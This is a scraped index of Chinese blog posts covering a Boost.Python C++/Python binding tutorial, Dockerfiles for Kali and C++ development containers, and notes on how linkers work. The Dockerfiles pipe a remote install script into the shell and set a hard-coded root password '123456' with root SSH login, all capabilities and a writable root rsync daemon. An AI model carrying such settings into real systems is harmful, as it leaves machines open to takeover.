python${PYTHON_VERSION_MAJOR}${PYTHON_VERSION_MINOR} python${PYTHON_VERSION_MAJOR} python ) # 输出 BOOST_ROOT 变量的值 message(BOOST_ROOT \u0026#34; ${BOOST_ROOT}\u0026#34;) # 设置变量 set(_boost_python_found \u0026#34;\u0026#34;) set(Boost_NAMESPACE \u0026#34;libboost\u0026#34;) set(Boost_USE_MULTITHREADED ON) set(Boost_USE_STATIC_LIBS OFF) set(Boost_USE_STATIC_RUNTIME OFF) # 循环查找 Boost 库的 Python 组件 foreach(_component IN ITEMS ${_components}) find_package(Boost COMPONENTS ${_component}) if(Boost_FOUND) set(_boost_python_found ${_component}) break() endif() endforeach() # 如果没有找到符合要求的 Boost.Python 组件，则输出错误信息 #if(_boost_python_found STREQUAL \u0026#34;\u0026#34;) # message(FATAL_ERROR \u0026#34;No matching Boost.Python component found\u0026#34;) #endif() # 添加头文件搜索路径 include_directories(\u0026#34;${PYTHON_INCLUDE_DIRS}\u0026#34;) include_directories(\u0026#34;${Boost_INCLUDE_DIRS}\u0026#34;) # 输出变量的值 message(PYTHON_INCLUDE_DIRS \u0026#34; ${PYTHON_INCLUDE_DIRS}\u0026#34;) message(PYTHON_LIBRARIES \u0026#34; ${PYTHON_LIBRARIES}\u0026#34;) message(Boost_INCLUDE_DIRS \u0026#34; ${Boost_INCLUDE_DIRS}\u0026#34;) message(Boost_LIBRARIES \u0026#34; ${Boost_LIBRARIES}\u0026#34;) # 添加子目录 01_HelloWorld ADD_SUBDIRECTORY(01_HelloWorld) 然后在01_HelloWorld文件夹下的CMakeLists.txt中控制动态共享库的生成：\n# 设置 MODULE_NAME 变量的值为 hello set(MODULE_NAME hello) set(source_code_dir ${CMAKE_SOURCE_DIR}/01_HelloWorld) set(CMAKE_LIBRARY_OUTPUT_DIRECTORY ${source_code_dir}/cpplib) # 添加头文件搜索路径为 CMAKE_SOURCE_DIR include_directories(${CMAKE_SOURCE_DIR}) # 添加动态库，名称为 MODULE_NAME 变量的值 add_library(${MODULE_NAME} SHARED HelloWorld.cpp ) # 根据操作系统设置动态库属性 if (UNIX) set_target_properties(${MODULE_NAME} PROPERTIES PREFIX \u0026#34;\u0026#34; ) elseif (WIN32) set_target_properties(${MODULE_NAME} PROPERTIES SUFFIX \u0026#34;.pyd\u0026#34; ) endif() # 链接 Boost 和 Python 库 target_link_libraries(${MODULE_NAME} ${Boost_LIBRARIES} ${PYTHON_LIBRARIES} ) 然后我们在HelloWorld.cpp中写入如下代码：\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;string\u0026gt; // 原始C++函数 std::string greet() { std::string str; std::cout \u0026lt;\u0026lt; \u0026#34;Please input your name: \u0026#34;; std::getline(std::cin,str); return str + \u0026#34;,hello!\u0026#34;; } #include \u0026lt;boost/python.hpp\u0026gt; // hello是python模块的名字，请务必和导入的python模块名一致 BOOST_PYTHON_MODULE(hello) { using namespace boost::python; // 将greet函数定义为python中的greet函数 def(\u0026#34;greet\u0026#34;, greet); } 然后我们使用cmake构建：\nmkdir build cd build cmake .. make 这时会在01_HelloWorld生成cpplib\\hello.so，然后由于这个动态文件已经为python定义了接口，所以python可以直接将其当成普通模块使用：\n#!/usr/bin/env python import cpplib.hello as hello print (hello.greet()) 输出如下：\nshow01——更复杂一些的例子 假设我们想要编写一个类，当其初始化的时候会读入二进制文件，然后将其转化为十六进制或二进制输出\n这一次我们将boost.python模块的代码放到单独的一个C++文件中，其他的代码按照头文件-源文件的组织方式编写，然后我们使用一个函数来返回C++对象，让它能够被python的GC机制托管\n生成模块的代码show01py.cpp #include \u0026lt;boost/python.hpp\u0026gt; #include \u0026lt;boost/python/module.hpp\u0026gt; #include \u0026lt;boost/python/class.hpp\u0026gt; #include \u0026lt;boost/python/manage_new_object.hpp\u0026gt; #include \u0026lt;boost/python/return_value_policy.hpp\u0026gt; #include \u0026#34;show01.hpp\u0026#34; BinaryFile* get_binary_file_obj(std::string filename){ return new BinaryFile(filename); } BOOST_PYTHON_MODULE(show01) { using namespace boost::python; def(\u0026#34;get_binary_file_obj\u0026#34;, get_binary_file_obj, return_value_policy\u0026lt;manage_new_object\u0026gt;()); class_\u0026lt;BinaryFile\u0026gt;(\u0026#34;BinaryFile\u0026#34;, init\u0026lt;std::string\u0026gt;()) .def(\u0026#34;get_hex\u0026#34;, \u0026amp;BinaryFile::get_hex) .def(\u0026#34;get_binary\u0026#34;, \u0026amp;BinaryFile::get_binary) ; } show01.hpp \u0026amp; show01.cpp 头文件：\n#ifndef __SHOW01_SHOW01_H__ #define __SHOW01_SHOW01_H__ #include \u0026lt;fstream\u0026gt; #include \u0026lt;string\u0026gt; class BinaryFile { public: BinaryFile() = delete; BinaryFile(std::string filename); ~BinaryFile(); // 定义其他函数 std::string get_hex(){ return hex_result_; } std::string get_binary(){ return binary_result_; } private: std::ifstream\u0026amp; fin; std::string hex_result_; std::string binary_result_; void read_content(); std::string to_hex(char ch); std::string to_bin(char ch); bool check_exist(); }; #endif /* __SHOW01_SHOW01_H__ */ 源文件：\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;sstream\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026#34;show01.hpp\u0026#34; BinaryFile::BinaryFile(std::string filename) :fin(*(new std::ifstream(filename))), hex_result_(\u0026#34;\u0026#34;), binary_result_(\u0026#34;\u0026#34;) { if (!check_exist()) { hex_result_ = \u0026#34;cannot open the file!\u0026#34;; binary_result_ = \u0026#34;cannot open the file!\u0026#34;; return; }else{ read_content(); } } BinaryFile::~BinaryFile() { fin.close(); delete \u0026amp;fin; hex_result_ = \u0026#34;Deleted!\u0026#34;; binary_result_ = \u0026#34;Deleted!\u0026#34;; } void BinaryFile::read_content() { char hex_char[17] = {0}; std::stringstream hss; hss \u0026lt;\u0026lt; \u0026#34;00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F | Decoded Text \\n\u0026#34;; hss \u0026lt;\u0026lt; \u0026#34;------------------------------------------------|----------------\\n\u0026#34;; std::stringstream bss; char buf = 0; char cnt = 0; char hexcnt = 0; while (fin.get(buf)) { // 一个字节一个字节地读取文件 // 处理读取到的字节 hss \u0026lt;\u0026lt; to_hex(buf) \u0026lt;\u0026lt; \u0026#39; \u0026#39;; if (isprint(buf)) { hex_char[hexcnt++] = buf; }else { hex_char[hexcnt++] = \u0026#39;.\u0026#39;; } bss \u0026lt;\u0026lt; to_bin(buf) \u0026lt;\u0026lt; \u0026#39; \u0026#39;; ++cnt; if (cnt \u0026gt;= 0x10) { hss \u0026lt;\u0026lt; \u0026#34;| \u0026#34; \u0026lt;\u0026lt; hex_char \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; hexcnt = 0; bss \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; cnt = 0; } } hex_result_ = hss.str(); binary_result_ = bss.str(); } std::string BinaryFile::to_hex(char ch) { const static char hex_dict[] { \u0026#39;0\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;5\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;7\u0026#39;, \u0026#39;8\u0026#39;, \u0026#39;9\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;f\u0026#39; }; char ret[3] = {0}; for(int i = 0; i \u0026lt; 2; i++) { ret[1-i] = hex_dict[(ch \u0026gt;\u0026gt; (i*4)) \u0026amp; 0xf]; } return ret; } std::string BinaryFile::to_bin(char ch) { char ret[9] = {0}; for(int i = 0; i \u0026lt; 8; i++) { ret[7-i] = ((ch \u0026gt;\u0026gt; i) \u0026amp; 0x1) + \u0026#39;0\u0026#39;; } return ret; } bool BinaryFile::check_exist() { if(!this-\u0026gt;fin.is_open()) { std::cerr \u0026lt;\u0026lt; \u0026#34;cannot open the file!\u0026#34; \u0026lt;\u0026lt; std::endl; return false; } return true; } 子目录的CMakeLists.txt # 设置 MODULE_NAME 变量的值为 hello set(MODULE_NAME show01) set(CMAKE_CXX_STANDARD 20) set(source_code_dir ${CMAKE_SOURCE_DIR}/show01) set(CMAKE_LIBRARY_OUTPUT_DIRECTORY ${source_code_dir}/cpplib) # 添加头文件搜索路径为 CMAKE_SOURCE_DIR include_directories(${CMAKE_SOURCE_DIR}) set(sourcefiles show01.cpp show01py.cpp) # 添加动态库，名称为 MODULE_NAME 变量的值 add_library(${MODULE_NAME} SHARED ${sourcefiles} ) # 根据操作系统设置动态库属性 if (UNIX) set_target_properties(${MODULE_NAME} PROPERTIES PREFIX \u0026#34;\u0026#34; ) elseif (WIN32) set_target_properties(${MODULE_NAME} PROPERTIES SUFFIX \u0026#34;.pyd\u0026#34; ) endif() # 链接 Boost 和 Python 库 target_link_libraries(${MODULE_NAME} ${Boost_LIBRARIES} ${PYTHON_LIBRARIES} ) show01.cpp import cpplib.show01 as show01 obj = show01.get_binary_file_obj(\u0026#34;/cpp/FileAnalyst/show01/test\u0026#34;) print(obj.get_hex()) # print(obj.get_binary()) 用于分析的二进制文件test.cpp-\u0026gt;test #include \u0026lt;iostream\u0026gt; int main(int argc, char const *argv[]) { std::cout \u0026lt;\u0026lt; \u0026#34;Hello World!\u0026#34; \u0026lt;\u0026lt; std::endl; return 0; } 编译完成后生成ELF文件test\n如何跑起来 首先我们主目录的CMakeLists.txt和01_HelloWorld中的基本一样，只用在末尾加一句：\nADD_SUBDIRECTORY(show01) 因此我们的组织形式如下：\n然后和之前一样的方法cmake就行，或者使用vscode的cmake插件\n最后使用命令运行python文件：\npython show01.py \u0026gt; hex_output.txt 结果：\n头部的ELF魔数说明对这个ELF文件的输出是正确的\n","date":"2023年03月09日","permalink":"https://peterliuzhi.top/posts/c++%E5%92%8Cpython%E4%BD%BF%E7%94%A8boost%E5%BA%93%E6%B7%B7%E5%90%88%E7%BC%96%E7%A8%8B/","section":"posts","summary":"Wherever a man may happen to turn, whatever a man may undertake, he will always end up by returning to the path which nature has marked out for him. — Johann Wolfgang von Goethe 注意，请保证你的机器上下载了boost库，如果没有，Ubuntu系统下使用： apt-get install libboost-all-dev","tags":["杂谈"],"title":"C++和python使用boost库混合编程"},{"categories":["posts"],"contents":" Happiness cannot be travelled to, owned, earned, worn or consumed. Happiness is the spiritual experience of living every minute with love, grace and gratitude. — Denis Waitley\nDockerfile 根据官网的描述，这个docker镜像不含任何默认工具：\n因此我们可以编写Dockerfile来控制docker的构建：\nFROM kalilinux/kali-rolling LABEL maintainer=\u0026#34;peterliuall \u0026lt;peterliuforever@gmail.com\u0026gt;\u0026#34; ENV DEBIAN_FRONTEND noninteractive ENV TZ Asia/Shanghai # 如果想要工具更齐全一点可以RUN apt update \u0026amp;\u0026amp; apt -y install kali-linux-large # 但是这样占用空间可能有点恐怖 RUN apt update \u0026amp;\u0026amp; apt -y install kali-linux-headless RUN chsh -s /bin/zsh \u0026amp;\u0026amp; echo \u0026#34;Y\u0026#34; | sh -c \u0026#34;$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\u0026#34; RUN zsh -c \u0026#34;apt install wget \u0026amp;\u0026amp; \\ wget https://repo.anaconda.com/miniconda/Miniconda3-py310_23.1.0-1-Linux-x86_64.sh \u0026amp;\u0026amp; \\ chmod a+x ./Miniconda3-py310_23.1.0-1-Linux-x86_64.sh \u0026amp;\u0026amp; \\ ./Miniconda3-py310_23.1.0-1-Linux-x86_64.sh -b -p $HOME/miniconda \u0026amp;\u0026amp; \\ source $HOME/miniconda/bin/activate \u0026amp;\u0026amp; conda init \u0026amp;\u0026amp;\\ echo \u0026#39;source $HOME/miniconda/bin/activate \u0026amp;\u0026amp; conda init \u0026gt; /dev/null\u0026#39; \u0026gt;\u0026gt; ~/.zshrc \u0026amp;\u0026amp; \\ source ~/.zshrc\u0026#34; RUN zsh -c \u0026#34;apt-get install openssh-server vim tmux\u0026#34; RUN zsh -c \u0026#34;source $HOME/miniconda/bin/activate \u0026amp;\u0026amp; conda init \u0026amp;\u0026amp; \\ python3 -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple -U pip \u0026amp;\u0026amp;\\ python3 -m pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple \u0026amp;\u0026amp; \\ ln -fs /usr/share/zoneinfo/$TZ /etc/localtime \u0026amp;\u0026amp; \\ dpkg-reconfigure -f noninteractive tzdata \u0026amp;\u0026amp; \\ ln -snf `which python3` /usr/local/bin/python\u0026#34; RUN mkdir /var/run/sshd RUN echo \u0026#34;PermitRootLogin yes\u0026#34; \u0026gt;\u0026gt; /etc/ssh/sshd_config RUN sed -ri \u0026#39;s/UsePAM yes/#UsePAM yes/g\u0026#39; /etc/ssh/sshd_config RUN sed -ri \u0026#39;s/RSYNC_ENABLE=false/RSYNC_ENABLE=true/g\u0026#39; /etc/default/rsync COPY rsync.conf /etc RUN echo \u0026#39;root:123456\u0026#39; |chpasswd RUN mkdir /root/sync RUN ls /usr/bin/ \u0026amp;\u0026amp; \\ locale-gen en_US.UTF-8 \u0026amp;\u0026amp; \\ echo \u0026#39;LANG=\u0026#34;en_US.UTF-8\u0026#34;\\nLANGUAGE=\u0026#34;en_US.UTF-8:\u0026#34;\u0026#39; \u0026gt; /etc/default/locale \u0026amp;\u0026amp; \\ echo \u0026#39;export LANG=\u0026#34;en_US.UTF-8\u0026#34;\\nexport LANGUAGE=\u0026#34;en_US.UTF-8:\u0026#34;\u0026#39; \u0026gt;\u0026gt; /etc/zsh/zshrc \u0026amp;\u0026amp; \\ /bin/zsh -c \u0026#34;source /etc/zsh/zshrc\u0026#34; WORKDIR /security RUN echo \u0026#34;cd /security\u0026#34; \u0026gt;\u0026gt; ~/.zshrc COPY entrypoint.sh /sbin RUN chmod +x /sbin/entrypoint.sh ENTRYPOINT [ \u0026#34;/sbin/entrypoint.sh\u0026#34; ] 安装了普通的kali配件，同时使用miniconda来管理python，使用oh-my-zsh来美化终端（主题默认）\n其他文件 其他文件包括entrypoint.sh、rsync.conf，全都放在与Dockerfile同一目录下：\nentrypoint.sh #!/bin/bash /usr/bin/rsync --daemon --config=/etc/rsync.conf /usr/sbin/sshd -D rsync.conf # 编辑配置信息 max connections = 8 log file = /var/log/rsync.log timeout = 300 [sync] # 模块名 comment = sync # path为需要同步的文件夹路径 path = /root/sync read only = no list = yes uid = root gid = root docker-compose.yml 这个文件用于控制container的生成，包含挂载共享文件夹，设置端口等：\nversion: \u0026#34;2.2\u0026#34; services: kali: image: kali:rolling container_name: kali_instance working_dir: /security volumes: - //d/database_BooksAndFiles/VMware/share_files/:/security/ ports: - \u0026#34;23:22\u0026#34; # 22是ssh端口 - \u0026#34;874:873\u0026#34; # 874是srync端口 cap_add: - ALL tty: true 如何食用 首先先build镜像文件：\ndocker build -t kali:rolling . 然后生成容器：\ndocker-compose up -d 如果想要登录docker的shell，可以使用如下命令：\ndocker exec -it \u0026lt;镜像文件id或全名\u0026gt; /bin/bash 下一次重启容器，可以使用docker desktop，也可以使用命令行：\ndocker restart \u0026lt;镜像文件id或全名\u0026gt; 然后在Windows Terminal中试一试ssh root@127.0.0.1 -p 23看一下能不能连上，能连上就可以用vscode连上\n如果不能连上，可以参见这篇SSH连接报错:Permission denied, please try again.的解决方法 - 腾讯云开发者社区-腾讯云\n使用vscode连接 先保证你的vscode有安装以下插件：\n然后在这里打开一个config文件：\n然后更改config文件如下：\n其中kaliDocker可以改成你喜欢的名字\n然后就可以连接啦\n通过密钥免密连接 因为vscode每次连接、更换文件夹都要输入密码，非常的不方便，因此我们可以使用公私密钥实现免密登录\n首先我们在Windows上生成公私密钥（如果之前生成过了就不用重新生成了）（现在一般Windows都会自带openssh了，直接就能用）：\nssh-keygen -t rsa 让它使用rsa加密的方式生成一个密钥，一直回车即可\n然后进入C:\\User\\\u0026lt;你的用户名\u0026gt;\\.ssh\\文件夹，然后就能看到自己生成的id_rsa和id_rsa.pub，其中.pub文件就是公钥\n然后使用scp将这个公钥传输到docker中的$HOME/.ssh/中，如果docker中没有这个文件夹，需要手动在docker中mkdir .ssh创建文件夹\nscp -P23 id_rsa.pub root@127.0.0.1:/root/.ssh 然后登录你的docker中的shell，将这个公钥加入已认证密钥列表中：\ncd ~/.ssh/ cat id_rsa.pub \u0026gt;\u0026gt; authorized_keys 然后就OK啦~\n","date":"2023年03月07日","permalink":"https://peterliuzhi.top/posts/%E5%88%9B%E5%BB%BAkali-docker%E7%8E%AF%E5%A2%83/","section":"posts","summary":"Happiness cannot be travelled to, owned, earned, worn or consumed. Happiness is the spiritual experience of living every minute with love, grace and gratitude. — Denis Waitley Dockerfile 根据官网的描述，这个docker镜像不含任何默认工具： 因此我们可以编写Dockerfile来控","tags":["杂谈","docker"],"title":"创建kali docker环境"},{"categories":["posts"],"contents":" The world makes way for the man who knows where he is going. — Ralph Waldo Emerson\n引子 因为虚拟机太慢太大，我尝试了一下WSL。但是不知道为什么，在我的机器上WSL卡成了PPT，无奈放弃，最终选择了docker。不得不说，空间占用又小，速度又快！\nDockerfile 这个环境基于ubuntu:22.04，安装了gcc、clang、clang-format、cmake等基本工具，同时安装了boost等基本的库（不够自己再装），同时安装了python，源都换成了阿里源\n本Dockerfile魔改自利用Docker搭载C/C++开发环境 - 知乎\nFROM ubuntu:22.04 LABEL maintainer=\u0026#34;peterliuall \u0026lt;peterliuforever@gmail.com\u0026gt;\u0026#34; ENV DEBIAN_FRONTEND noninteractive ENV TZ Asia/Shanghai # 添加源 COPY ./sources.list /etc/apt/ RUN dpkg --add-architecture i386 \u0026amp;\u0026amp; \\ apt-get upgrade \u0026amp;\u0026amp; \\ apt-get update \u0026amp;\u0026amp; \\ apt-get install -y build-essential \\ locales \\ libc6:i386 \\ libc6-dbg:i386 \\ libc6-dbg \\ lib32stdc++6 \\ g++-multilib \\ gdb \\ gdb-multiarch \\ netcat \\ socat \\ git \\ patchelf \\ gawk \\ file \\ python3-distutils \\ bison \\ rpm2cpio cpio \\ zstd \\ binutils \\ qemu \\ strace \\ ltrace \\ nasm \\ wget \\ cmake \\ clang-tidy \\ clangd \\ net-tools \\ iputils-ping \\ openssh-server \\ rsync \\ gcc g++ \\ tmux \\ binutils-dev \\ mpi-default-dev libicu-dev libbz2-dev libssl-dev libffi-dev libboost-all-dev \\ python3-dev python3-pip \\ sudo \\ curl \\ ssh \\ vim \\ re2c \\ clang clang-format global cppcheck \\ tzdata --fix-missing RUN python3 -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple -U pip \u0026amp;\u0026amp;\\ python3 -m pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple \u0026amp;\u0026amp; \\ python3 -m pip install lizard RUN git clone https://github.com/ninja-build/ninja.git \u0026amp;\u0026amp; \\ cd ninja \u0026amp;\u0026amp; \\ ./configure.py --bootstrap \u0026amp;\u0026amp; \\ cp ninja /usr/bin/ \u0026amp;\u0026amp; \\ apt-get install -y ninja-build \u0026amp;\u0026amp; ninja --version RUN ln -fs /usr/share/zoneinfo/$TZ /etc/localtime \u0026amp;\u0026amp; \\ dpkg-reconfigure -f noninteractive tzdata \u0026amp;\u0026amp; \\ ln -snf `which python3` /usr/local/bin/python RUN mkdir /var/run/sshd \u0026amp;\u0026amp; mkdir ~/.ssh # RUN sed -ri \u0026#39;s/^PermitRootLogin\\s+.*/PermitRootLogin yes/\u0026#39; /etc/ssh/sshd_config RUN echo \u0026#34;PermitRootLogin yes\u0026#34; \u0026gt;\u0026gt; /etc/ssh/sshd_config RUN sed -ri \u0026#39;s/UsePAM yes/#UsePAM yes/g\u0026#39; /etc/ssh/sshd_config RUN sed -ri \u0026#39;s/RSYNC_ENABLE=false/RSYNC_ENABLE=true/g\u0026#39; /etc/default/rsync COPY rsync.conf /etc RUN echo \u0026#39;root:123456\u0026#39; |chpasswd RUN mkdir /root/sync RUN ls /usr/bin/ \u0026amp;\u0026amp; \\ python3 -V \u0026amp;\u0026amp; \\ locale-gen en_US.UTF-8 \u0026amp;\u0026amp; \\ echo \u0026#39;LANG=\u0026#34;en_US.UTF-8\u0026#34;\\nLANGUAGE=\u0026#34;en_US.UTF-8:\u0026#34;\u0026#39; \u0026gt; /etc/default/locale \u0026amp;\u0026amp; \\ echo \u0026#39;export LANG=\u0026#34;en_US.UTF-8\u0026#34;\\nexport LANGUAGE=\u0026#34;en_US.UTF-8:\u0026#34;\u0026#39; \u0026gt; /etc/bash.bashrc \u0026amp;\u0026amp; \\ /bin/bash -c \u0026#34;source /etc/bash.bashrc\u0026#34; WORKDIR /cpp/ COPY entrypoint.sh /sbin RUN chmod +x /sbin/entrypoint.sh ENTRYPOINT [ \u0026#34;/sbin/entrypoint.sh\u0026#34; ] 其他文件 其他文件包括entrypoint.sh、rsync.conf、sources.list，全都放在与Dockerfile同一目录下：\nentrypoint.sh #!/bin/bash /usr/bin/rsync --daemon --config=/etc/rsync.conf /usr/sbin/sshd -D rsync.conf # 编辑配置信息 max connections = 8 log file = /var/log/rsync.log timeout = 300 [sync] # 模块名 comment = sync # path为需要同步的文件夹路径 path = /root/sync read only = no list = yes uid = root gid = root sources.list 这个文件用来放Ubuntu22.04的阿里源/etc/apt/sources.list：\ndeb http://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiverse docker-compose.yml 这个文件用于生成容器，其中操作包括共享文件夹、暴露端口，记得改volumes下的//d/database_BooksAndFiles/CPP/为你自己主机上的文件夹：\nversion: \u0026#34;2.2\u0026#34; services: ubuntu: image: ubuntu:latest container_name: ubuntu working_dir: /cpp/ volumes: - //d/database_BooksAndFiles/CPP/:/cpp/ ports: - \u0026#34;22:22\u0026#34; # 22是ssh端口 - \u0026#34;873:873\u0026#34; # 873是srync端口 cap_add: - ALL tty: true 如何食用 首先先build镜像文件：\ndocker build -t ubuntu:latest . 然后生成容器：\ndocker-compose up -d 如果想要登录docker的shell，可以使用如下命令：\ndocker exec -it \u0026lt;镜像文件id或全名\u0026gt; /bin/bash 下一次重启容器，可以使用docker desktop，也可以使用命令行：\ndocker restart \u0026lt;镜像文件id或全名\u0026gt; 然后在Windows Terminal中试一试ssh root@127.0.0.1 -p 22看一下能不能连上，能连上就可以用vscode连上\n如果不能连上，可以参见这篇SSH连接报错:Permission denied, please try again.的解决方法 - 腾讯云开发者社区-腾讯云\n使用vscode连接 先保证你的vscode有安装以下插件：\n然后在这里打开一个config文件：\n然后更改config文件如下：\n其中C++Docker可以改成你喜欢的名字\n然后就可以连接啦\n通过密钥免密连接 因为vscode每次连接、更换文件夹都要输入密码，非常的不方便，因此我们可以使用公私密钥实现免密登录\n首先我们在Windows上生成公私密钥（如果之前生成过了就不用重新生成了）（现在一般Windows都会自带openssh了，直接就能用）：\nssh-keygen -t rsa 让它使用rsa加密的方式生成一个密钥，一直回车即可\n然后进入C:\\User\\\u0026lt;你的用户名\u0026gt;\\.ssh\\文件夹，然后就能看到自己生成的id_rsa和id_rsa.pub，其中.pub文件就是公钥\n然后使用scp将这个公钥传输到docker中的$HOME/.ssh/中，如果docker中没有这个文件夹，需要手动在docker中mkdir .ssh创建文件夹\nscp id_rsa.pub root@127.0.0.1:/root/.ssh 然后登录你的docker中的shell，将这个公钥加入已认证密钥列表中：\ncd ~/.ssh/ cat id_rsa.pub \u0026gt;\u0026gt; authorized_keys 然后就OK啦~\n","date":"2023年03月07日","permalink":"https://peterliuzhi.top/posts/%E5%88%9B%E5%BB%BAc++-docker%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83vscode/","section":"posts","summary":"The world makes way for the man who knows where he is going. — Ralph Waldo Emerson 引子 因为虚拟机太慢太大，我尝试了一下WSL。但是不知道为什么，在我的机器上WSL卡成了PPT，无奈放弃，最终选择了d","tags":["杂谈","docker"],"title":"创建C++ docker开发环境（VScode）"},{"categories":["principle"],"contents":" There are basically two types of people. People who accomplish things, and people who claim to have accomplished things. The first group is less crowded. — Mark Twain\n本文是笔者阅读《俞甲子, 石凡, 潘爱民 - 程序员的自我修养_ 链接、装载与库-电子工业出版社 (2009)》的学习笔记~\n链接的原因与原理 由于工程组织与后期维护的需要，我们将源文件编译成一个个目标文件（Linux下是.o，Windows下是.obj），所以我们需要一种方式将他们整合起来。\n那么，我们应该如何将他们整合起来呢？是像预处理器处理include那样直接拼接在一起吗？显然不行，原因如下：\n在我们编译其中一个代码文件的时候，编译器是不知道某个未在本源文件的函数的地址的，比如如下代码，编译器虽然因为include了头文件得到了printf的声明，但是编译器并不知道它的定义的地址，那在主函数call的时候也就无从转向这个函数： #include\u0026lt;stdio.h\u0026gt; int main(void){ printf(\u0026#34;Hello World!\\n\u0026#34;); return 0; } 因为在不同的源文件中可能多次声明了一个同名弱符号，需要链接器进行判断，最后在统一的可执行文件中使用那个弱符号（有强符号使用强符号） 不同的可执行文件都有各自的文件头、段和节，如果粗暴地拼接在一起，那对这些信息的索引将非常麻烦，因此需要链接器将他们整合在一起 因为空间对齐和分页机制的影响，如果只是粗暴地拼接在一起，会造成空间的极大浪费 因着这些缺点，所以现在大部分链接器都采用两步链接的方法。\n第一步：相似段（节）合并（空间与地址分配） 分配实际地址空间和虚拟地址地址 因为bss段中是未初始化的变量，在目标文件和可执行文件中并不占用空间，只在装载入内存时占用地址空间。但是为了程序中使用bss段中的变量时能够寻址，链接器会为它分配虚拟地址空间，意味着它只在装载的时候才占用空间（依赖文件头的定义）。\n因此，像.text，.data这样的段（节），链接器不仅会为他们分配虚拟地址空间，还会为他们在可执行文件（目标文件）中分配空间；而像.bss这样的段（节），链接器只会为他们分配虚拟地址空间。\nVMA和LMA VMA（Virtual Memory Address，虚拟内存地址）意为程序运行时的虚拟空间地址；LMA（Load Memory Address，加载空间地址）意为程序在执行前的加载过程使用的地址。两者一般情况下相同，在一些特殊的嵌入式系统上会有差别。\n下面我们用objdump查看一下VMA和LMA。我写了两个小的源文件，编译得到了他们两个的目标文件和合并后的可执行文件：\n用objdump分别查看header：\n可以看到目标文件在合并前的VMA和LMA都是0，这是因为此时虚拟空间还没有分配。而等到链接以后，虚拟空间分配了以后，VMA和LMA才发生了变化：\n两者在普通情况下都是相等的。\nCOMMON块机制判断同名弱符号声明 对于之前提到的多个同名弱符号的问题，因为链接器不知道符号的类型，只知道一个符号的名字，所以编译器使用了一种和fortran中类似的办法：以占用空间最大的那个为准。\n因此如果可执行文件中同名的符号全都是弱符号，那么链接器在链接过程中是可以判断符号的占用空间大小的，因此，这些未初始化全局变量最终会变成.bss节中的一份子。因此，common块机制让这些未初始化全局变量能够像未初始化局部静态变量一样被放进.bss节\n当然，我们也可以在gcc中指定\u0026quot;-fno-common\u0026quot;选项或者使用__attribute__((nocommon))扩展防止一个未初始化全局变量被放进common块。不过一旦这么做了，那它就会被判定为强符号；一旦可执行文件中出现了重复的强符号，链接器就会报错。\n符号地址的确定 在前面分配空间的时候，段基址就已经确定了，现在需要确定各个符号的地址。符号地址=（所属）段基址+偏移\n第二步：符号解析与重定向 重定位基本介绍 在我们确定了符号地址之后，由于我们代码中call、jmp还有使用到全局变量等的地方的地址还是\u0026quot;假地址\u0026quot;，需要改成已经确定后的\u0026quot;真地址\u0026quot;，因此需要重定位\n而因为不同处理器的指令都不太一样，所以这些重定位的符号修正方式都不太一样，要具体问题具体分析\n如何找到需要重定位的指令 在ELF文件中，有一个重定位表储存相关信息，它往往是一个或者多个段。\n比如若.text节有需要重定位的地方，段名就是.rel.text；.data同理，为.rel.data\n重定位表被描述为重定位入口和其类型与符号的结构体：\n其中r_offset也就是偏移在动态链接中有不同的含义，但总的来说，都是用来定址的。\n符号解析 因为每一个重定位入口都是一个对符号的引用，因此如果要进行重定位，必须首先确定该符号的地址，这时链接器就会去查找全局符号表，找到相应的符号后进行重定位。\n因此，如果程序缺少某一个库，而又依赖于这个库，那么进行重定位的时候链接器就找不到使用这个库的符号的实际地址（分配的虚拟地址）\nC++对链接的影响 重复代码消除 C++很容易在编译阶段产生重复代码，比如模板、外部内联函数、虚函数表等。\n比如模板，对单文件编译的时候，编译器并不知道是否在别的文件里实例化了，因此在不同文件中可能有重复的函数，这样会产生以下问题：\n空间浪费 地址易出错 指令运行效率较低 我们可以设计一个类似登记表的结构，只要出现了这个函数，那么就把他登记在登记表上。这样每一个目标文件都会有这样一个\u0026quot;登记表\u0026quot;，在链接时可以通过查表来丢弃重复段。\n根据这种思想，不同编译器有不同做法，比如：\ngcc使用.gnu.linkonce.name段，其中登记的数据是函数经过修饰后的名字 MSVC使用COMDAT段，它的成员都有IMAGE_SCN_LNK_COMDAT标记，一旦编译器发现了这个标记，它就会把该段看作COMDAT类型，在链接时将重复的段丢弃 全局构造与析构 在main函数之前总是需要进行一些初始化操作，在其之后也需要一些清理工作。\n在Linux下一般程序的入口是_start函数，在main函数之前执行，并调用main函数，在main函数执行完之后返回_start函数进行清理工作。针对这两者不同的特殊需求，ELF文件还定义了两种不同的段：\n.init，存放初始化代码指令 .fini，存放终止代码指令 ABI 